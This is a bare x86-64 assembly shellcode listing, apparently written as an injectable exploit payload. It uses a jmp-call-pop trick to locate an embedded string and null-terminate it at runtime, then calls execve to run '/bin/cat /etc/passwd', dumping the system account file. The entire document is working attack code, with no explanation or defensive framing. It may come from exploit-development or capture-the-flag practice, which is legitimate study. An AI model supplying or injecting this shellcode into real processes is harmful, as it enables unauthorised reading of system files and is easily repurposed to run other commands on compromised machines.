        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop rax
        xor rdx, rdx
        lea rcx, [rax+1]
        mov rsi, rcx
        add cl, [rax]
        mov [rcx], dl
        push rdx
        mov rax, 0x7461632f6e69622f  /* "/bin/cat" */
        push rax
        mov rdi, rsp
        push rdx
        push rsi
        push rdi
        mov rsi, rsp
        lea rax, [rdx+59]            /* execve */
        syscall
caller:
        call callee
pstring:
        .byte 11
        .ascii "/etc/passwd"
